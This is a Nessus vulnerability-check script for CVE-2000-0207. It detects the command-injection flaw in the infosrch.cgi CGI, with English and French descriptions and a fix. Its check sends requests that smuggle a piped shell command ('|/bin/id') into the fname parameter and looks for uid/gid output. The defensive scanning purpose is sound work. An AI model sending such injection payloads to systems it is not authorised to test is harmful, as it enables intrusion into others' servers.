#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10128);
 script_version ("$Revision: 1.18 $");
 script_bugtraq_id(1031);
 script_cve_id("CVE-2000-0207");
 name["english"] = "infosrch.cgi";
 name["francais"] = "infosrch.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'infosrch.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker execute arbitrary
commands with the privileges of the http daemon (usually root or nobody).

Solution : Remove it from /cgi-bin.

Risk factor : Serious";


 desc["francais"] = "Le cgi 'infosrch.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/infosrch.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/infosrch.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);



req = http_get(item:"/infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id",port:port);
rep = http_keepalive_send_recv(port:port, data:req);
if( rep == NULL ) exit(0);

if(("uid=" >< rep) && ("gid=" >< rep)){
     security_hole(port);
     exit(0);
     }

foreach dir (cgi_dirs())
{
 req2 = http_get(item:string(dir,"/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/bin/id"), port:port);
 r2 = http_keepalive_send_recv(port:port, data:req2);
 if(r2 == NULL)exit(0);
 if(("uid=" >< r2) && ("gid=" >< r2)){
      security_hole(port);
      exit(0);
      }
}

